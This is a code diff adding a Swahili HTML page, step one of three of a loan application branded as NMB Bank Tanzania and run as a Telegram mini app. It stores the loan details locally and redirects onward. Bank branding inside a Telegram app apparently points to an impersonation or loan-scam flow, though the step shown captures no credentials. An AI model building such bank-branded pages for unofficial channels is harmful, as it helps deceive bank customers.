@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>NMB Bank - Maombi ya Mkopo</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --nmb-blue: #0047ab;
+            --nmb-hover: #003380;
+            --bg-color: #f0f4f8;
+            --card-bg: #ffffff;
+            --text-main: #0f172a;
+            --text-muted: #64748b;
+            --input-border: #cbd5e1;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .app-header {
+            width: 100%;
+            background-color: var(--nmb-blue);
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .back-btn {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            font-size: 20px;
+            font-weight: 800;
+            color: white;
+        }
+
+        .header-title .nmb { color: white; margin-right: 4px; }
+        .header-title .bank { color: #93c5fd; }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 22px;
+            height: 3px;
+            background-color: white;
+            border-radius: 2px;
+        }
+
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 440px;
+            margin: 20px 0 30px;
+            padding: 32px 24px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 26px;
+            color: var(--text-main);
+            margin: 0 0 6px;
+            text-align: center;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .subtext {
+            font-size: 14px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: space-center;
+            gap: 12px;
+            margin: 0 auto 32px;
+            width: 80%;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 4px;
+            background-color: #e2e8f0;
+            border-radius: 2px;
+        }
+
+        .step-bar.active {
+            background-color: var(--nmb-blue);
+        }
+
+        .form-group {
+            margin-bottom: 22px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 15px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 10px;
+        }
+
+        .form-control {
+            font-size: 15px;
+            padding: 14px 16px;
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            background-color: #ffffff;
+            color: #334155;
+            outline: none;
+            width: 100%;
+        }
+
+        .form-control:focus {
+            border-color: var(--nmb-blue);
+        }
+
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23334155' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            background-size: 14px;
+            padding-right: 40px;
+            cursor: pointer;
+        }
+
+        textarea.form-control {
+            resize: none;
+            height: 95px;
+            font-family: inherit;
+        }
+
+        .btn-next {
+            background-color: var(--nmb-blue);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            margin-top: 15px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: var(--nmb-hover);
+        }
+
+        .footer-banner {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #64748b;
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="app-header">
+    <a href="/" class="back-btn">← Rudi</a>
+    <div class="header-title">
+        <span class="nmb">NMB</span><span class="bank">Bank</span>
+    </div>
+    <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Maombi ya Mkopo</h1>
+    <div class="subtext">Hatua ya 1 kati ya 3</div>
+
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar"></div>
+        <div class="step-bar"></div>
+    </div>
+
+    <form id="loanForm" onsubmit="submitStep1(event)">
+        <div class="form-group">
+            <label for="loanType">Aina ya Mkopo</label>
+            <select id="loanType" class="form-control" required>
+                <option value="Mkopo wa Binafsi" selected>Mkopo wa Binafsi</option>
+                <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
+                <option value="Mkopo wa Elimu">Mkopo wa Elimu</option>
+                <option value="Mkopo wa Haraka">Mkopo wa Haraka</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="loanAmt">Kiasi cha Mkopo (TZS)</label>
+            <input type="number" id="loanAmt" class="form-control" placeholder="500000" value="500000" required>
+        </div>
+
+        <div class="form-group">
+            <label for="loanTerm">Muda wa Mkopo</label>
+            <select id="loanTerm" class="form-control" required>
+                <option value="Miezi 3">Miezi 3</option>
+                <option value="Miezi 6">Miezi 6</option>
+                <option value="Miezi 12" selected>Miezi 12</option>
+                <option value="Miezi 24">Miezi 24</option>
+                <option value="Miezi 36">Miezi 36</option>
+                <option value="Miezi 48">Miezi 48</option>
+                <option value="Miezi 60">Miezi 60</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="loanPurpose">Sababu ya Mkopo</label>
+            <textarea id="loanPurpose" class="form-control" placeholder="Fedha hizi zitatumika kwa shughuli gani?" required></textarea>
+        </div>
+
+        <button type="submit" class="btn-next">HATUA INAYOFUATA</button>
+    </form>
+</div>
+
+<div class="footer-banner">
+    © 2026 NMB Bank Tanzania PLC
+</div>
+
+<script>
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        const savedAmount = localStorage.getItem('loan_amount') || localStorage.getItem('amount');
+        const savedDuration = localStorage.getItem('loan_term') || localStorage.getItem('loanDuration');
+
+        if (savedAmount) {
+            const digitsOnly = savedAmount.toString().replace(/\D/g, '');
+            if (digitsOnly) {
+                document.getElementById('loanAmt').value = digitsOnly;
+            }
+        }
+
+        if (savedDuration) {
+            const formattedDuration = savedDuration.toString().trim().toLowerCase();
+            const selectEl = document.getElementById('loanTerm');
+            
+            for (let i = 0; i < selectEl.options.length; i++) {
+                if (selectEl.options[i].value.toLowerCase().includes(formattedDuration) || formattedDuration.includes(selectEl.options[i].value.toLowerCase().replace(/\D/g, ''))) {
+                    selectEl.selectedIndex = i;
+                    break;
+                }
+            }
+        }
+    };
+
+    function submitStep1(event) {
+        event.preventDefault();
+
+        const loanType = document.getElementById('loanType').value;
+        const loanAmt = Number(document.getElementById('loanAmt').value) || 0;
+        const loanTermVal = document.getElementById('loanTerm').value;
+        const loanPurpose = document.getElementById('loanPurpose').value;
+
+        const months = Number(loanTermVal.replace(/\D/g, '')) || 12;
+
+        const annualRate = 0.10;
+        const totalInterest = loanAmt * annualRate * (months / 12);
+        const monthlyPayment = Math.round((loanAmt + totalInterest) / months);
+
+        localStorage.setItem('loan_amount', loanAmt);
+        localStorage.setItem('amount', loanAmt);
+        localStorage.setItem('appliedAmount', loanAmt);
+
+        localStorage.setItem('loan_term', months);
+        localStorage.setItem('duration', months);
+        localStorage.setItem('appliedTerm', loanTermVal);
+
+        localStorage.setItem('monthly_repayment', monthlyPayment);
+        localStorage.setItem('appliedLoanType', loanType);
+        localStorage.setItem('appliedPurpose', loanPurpose);
+
+        window.location.href = "/page3"; 
+    }
+</script>
+
+</body>
+  </html>
+  
